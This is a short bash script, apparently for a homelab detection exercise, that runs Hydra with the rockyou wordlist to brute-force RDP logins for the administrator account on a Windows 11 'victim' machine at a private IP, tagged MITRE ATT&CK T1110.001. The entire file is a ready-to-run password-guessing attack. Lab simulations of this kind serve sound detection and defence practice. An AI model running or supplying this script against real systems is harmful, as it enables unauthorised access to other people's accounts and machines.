#!/bin/bash
# RDP Brute Force Simulation
# MITRE ATT&CK: T1110.001
# Target: Windows 11 Victim
# Tool: Hydra
# WARNING: For homelab use only

TARGET="192.168.56.106"
USERNAME="administrator"
WORDLIST="/usr/share/wordlists/rockyou.txt"

echo "[*] Starting RDP brute force against $TARGET"
echo "[*] Username: $USERNAME"
echo "[*] Wordlist: $WORDLIST"
echo ""

hydra -l $USERNAME -P $WORDLIST rdp://$TARGET -t 4 -W 3
